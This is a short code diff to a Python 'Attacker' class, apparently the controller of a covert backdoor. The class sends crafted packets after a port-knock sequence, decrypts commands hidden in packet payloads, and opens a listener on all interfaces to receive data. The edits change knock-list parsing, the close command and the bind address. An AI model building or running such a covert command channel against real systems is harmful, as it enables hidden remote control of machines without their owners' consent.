@@ -29,7 +29,11 @@ class Attacker(object):
         self.protocol = proto.upper()
 
         self.password = password
-        self.knockList = kList
+
+        self.knockList = []
+        for port in kList.split(','):
+            self.knockList.append(port)
+
         self.ttl = ttl
         self.state = 0
 
@@ -73,7 +77,7 @@ class Attacker(object):
 
             send(packet, verbose=False)
 
-            if cmd == 'close':
+            if cmd == 'CLOSE':
                 print("Attacker closed...\n")
                 os._exit(0)
 
@@ -81,6 +85,7 @@ class Attacker(object):
         """
         """
         payload = packet[self.protocol].payload.load
+        print(encryption.decrypt(payload))
         data = helpers.decode(encryption.decrypt(payload))
         if data == "":
             return
@@ -127,7 +132,7 @@ class Attacker(object):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        sock.bind((self.localIP, self.listenPort))
+        sock.bind(("", self.listenPort))
 
         sock.listen(1)
         print("Ready to receive...")
